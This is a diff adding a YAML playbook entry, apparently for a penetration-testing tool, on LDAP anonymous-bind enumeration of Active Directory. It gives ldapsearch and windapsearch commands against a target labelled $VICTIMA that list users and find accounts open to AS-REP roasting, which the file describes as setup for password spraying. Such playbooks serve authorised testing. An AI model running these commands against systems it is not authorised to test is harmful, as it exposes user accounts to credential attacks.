@@ -1,0 +1,48 @@
+chain_id: ldap_anonymous_bind
+title: "LDAP — anonymous bind enumeration"
+severity: MEDIUM
+tags: [ldap, ad, enumeration, anonymous]
+
+trigger:
+  any_of:
+    - { port: 389 }
+    - { port: 636 }
+    - { port: 3268 }
+    - { service: ldap }
+    - { service: ldaps }
+
+description: |
+  Open LDAP service. Many internal AD servers permit anonymous bind for
+  the rootDSE and even for user/group queries. A successful anonymous
+  enumeration hands you the domain naming context, password policy, and
+  often the full user list — input for AS-REP roast / password spray.
+
+steps:
+  - id: 1
+    title: "Read the rootDSE — confirms anonymous bind works and discovers the base DN"
+    command: ldapsearch -x -H ldap://$VICTIMA -s base "(objectclass=*)"
+
+  - id: 2
+    title: "Enumerate users (replace DC=... with the namingContexts from step 1)"
+    command: ldapsearch -x -H ldap://$VICTIMA -b 'DC=DOMAIN,DC=LOCAL' '(objectClass=user)' sAMAccountName
+
+  - id: 3
+    title: "Pull every account marked DontReqPreAuth (AS-REP roastable)"
+    command: |
+      ldapsearch -x -H ldap://$VICTIMA -b 'DC=DOMAIN,DC=LOCAL' \
+        '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
+        sAMAccountName
+
+  - id: 4
+    title: "Enumerate with windapsearch (more polished output)"
+    command: windapsearch -d $DOMAIN --dc $VICTIMA -U
+
+common_errors:
+  - error: "Operations error (000004DC)"
+    solution: |
+      Server requires authentication for the requested object. Try with
+      a known credential:
+        ldapsearch -x -H ldap://$VICTIMA -D 'USER@DOMAIN' -w 'PASSWORD' -b '...' '(...)'
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
